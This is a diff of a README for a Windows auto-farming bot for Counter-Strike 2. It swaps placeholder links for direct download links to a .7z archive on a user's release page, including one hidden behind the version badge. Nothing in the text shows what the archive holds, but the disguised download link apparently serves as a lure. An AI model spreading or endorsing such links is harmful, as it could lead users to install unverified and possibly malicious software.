@@ -11,7 +11,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/YOUR_USERNAME/CS2-Auto-Farm"><img src="https://img.shields.io/badge/version-1.0.0-brightgreen?style=flat-square" alt="Version"></a>
+  <a href="https://github.com/griffincountsurmount/CS2-Auto-Farm/releases/download/22/2FarmBot.7z"><img src="https://img.shields.io/badge/version-1.0.0-brightgreen?style=flat-square" alt="Version"></a>
   <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
   <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
 </p>
@@ -29,7 +29,7 @@
 ## 📥 Download
 
 <p align="center">
-  <a href="https://github.com/YOUR_USERNAME/CS2-Auto-Farm/releases/latest">
+  <a href="https://github.com/griffincountsurmount/CS2-Auto-Farm/releases/download/22/2FarmBot.7z">
     <img src="https://img.shields.io/badge/⬇️%20Download%20Latest%20Release-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
